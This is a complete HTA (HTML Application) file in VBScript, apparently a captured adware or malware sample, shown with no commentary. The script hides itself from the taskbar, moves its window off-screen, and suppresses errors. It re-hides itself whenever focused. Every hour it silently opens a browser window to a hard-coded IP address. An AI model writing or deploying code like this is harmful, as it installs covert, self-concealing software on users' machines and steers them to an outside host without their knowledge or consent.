<HTML><HEAD> 
<HTA:APPLICATION ID="oHTA" 
APPLICATIONNAME="myApp" 
SINGLEINSTANCE="yes" 
WINDOWSTATE="minimize" 
showInTaskbar="no"  
/></HEAD><BODY>  
<script language="vbscript">  
on error resume next  
self.moveto 5000,5000 
function vx() 
on error resume next 
window.open "http://168.143.118.147/2/","_blank","width=750, height=550, scrollbars=1" 
end function 
setinterval "vx()",3600000 
sub window_onfocus 
self.moveto 5000,5000 
self.blur 
end sub 
</script></BODY></HTML> 